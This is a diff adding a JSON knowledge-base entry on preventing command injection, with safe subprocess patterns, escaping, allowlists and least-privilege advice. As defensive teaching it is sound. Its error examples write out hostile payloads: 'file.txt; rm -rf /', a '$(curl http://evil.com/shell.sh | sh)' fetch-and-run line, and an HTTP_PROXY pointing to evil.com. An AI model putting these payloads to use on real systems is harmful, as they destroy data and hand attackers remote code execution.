@@ -1,0 +1,73 @@
+{
+  "door_code": "S24COMMAND_INJECTION",
+  "semantic_path": "SECURITY.VULNERABILITIES.COMMAND_INJECTION",
+  "aliases": ["command injection", "shell injection", "os command injection", "code injection", "exec vulnerability"],
+  "context_bundle": {
+    "summary": "Command injection prevention: avoid shell execution with user input, use parameterized APIs (subprocess with array args), validate input against strict allowlists, escape shell metacharacters if shell required, prefer native libraries over shelling out, principle of least privilege for process execution.",
+    "prerequisites": ["S03INPUT_VAL", "S16INPUT_SANITIZATION"],
+    "related_doors": ["S02SQL", "S19PATH_TRAVERSAL", "E01PERM"],
+    "onboarding": {
+      "quick_start": "Command injection defense: 1) NEVER concatenate user input into shell commands, 2) Use subprocess/exec APIs with array arguments (avoids shell interpretation), 3) If shell required, use shlex.quote() or equivalent escaping, 4) Validate input against strict allowlist (alphanumeric only), 5) Run with minimal privileges.",
+      "full_context_path": "/PhiDEX/MASTER_CODEX/06_SECURITY/OWASP_TOP_10_GUIDE.md",
+      "common_patterns": [
+        "Python: subprocess.run(['ls', user_dir], shell=False) - Array args, no shell",
+        "Node.js: child_process.execFile('ls', [user_dir]) - No shell interpretation",
+        "PHP: escapeshellarg($user_input) before passing to exec() - Escape special chars",
+        "Java: ProcessBuilder with List<String> args - Avoids shell",
+        "Input validation: Allowlist alphanumeric + specific safe chars, reject ; | & $ ( ) < > `",
+        "Least privilege: Run process as non-root user with minimal permissions"
+      ],
+      "known_errors": [
+        {
+          "error": "Shell injection via semicolon: user_input = 'file.txt; rm -rf /'",
+          "cause": "Concatenating user input into shell command: os.system('cat ' + user_input)",
+          "solution": "Use subprocess with array args: subprocess.run(['cat', user_input], shell=False)",
+          "prevention": "Never use os.system(), exec(), eval() with user input. Use subprocess/execFile with arrays.",
+          "example": "GOOD: ['cat', filename]. BAD: 'cat ' + filename"
+        },
+        {
+          "error": "Command injection via backticks or $() substitution",
+          "cause": "User input contains `whoami` or $(curl http://evil.com/shell.sh | sh)",
+          "solution": "Disable shell interpretation: use shell=False in subprocess, or escapeshellarg() in PHP",
+          "prevention": "Input validation: reject characters like ` $ ( ) ; | &",
+          "related_door": "S16INPUT_SANITIZATION"
+        },
+        {
+          "error": "Path traversal leading to command injection",
+          "cause": "User controls filename that gets passed to command: tar -czf backup.tar.gz USER_PATH",
+          "solution": "Validate path is within safe directory + use array args: ['tar', '-czf', 'backup.tar.gz', safe_path]",
+          "prevention": "Combine path validation (S19PATH_TRAVERSAL) with command injection prevention",
+          "related_door": "S19PATH_TRAVERSAL"
+        },
+        {
+          "error": "Environment variable injection: HTTP_PROXY=http://evil.com",
+          "cause": "User-controlled environment variables passed to subprocess",
+          "solution": "Sanitize environment: Pass clean env dict, don't inherit all variables",
+          "prevention": "subprocess.run(..., env={'SAFE_VAR': 'value'}) - Explicit allowlist of env vars",
+          "example": "Python: subprocess.run(cmd, env={'PATH': '/usr/bin', 'HOME': '/tmp'})"
+        }
+      ]
+    },
+    "resources": {
+      "docs": [
+        "/PhiDEX/MASTER_CODEX/06_SECURITY/OWASP_TOP_10_GUIDE.md",
+        "/PhiDEX/MASTER_CODEX/06_SECURITY/SECURITY_HARDENING_GUIDE.md"
+      ],
+      "code": [],
+      "tests": [],
+      "errors": []
+    },
+    "metadata": {
+      "last_updated": "2025-11-22T04:00:00Z",
+      "confidence": 1.0,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "tags": ["command_injection", "shell_injection", "os_command", "rce", "owasp"],
+      "category": "SECURITY",
+      "subcategory": "VULNERABILITIES",
+      "version": "1.0.0",
+      "tested_on": ["Python", "Node.js", "PHP", "Java", "Ruby"],
+      "agent_affinity": ["VSCC", "DC", "TERMC"]
+    }
+  }
+}
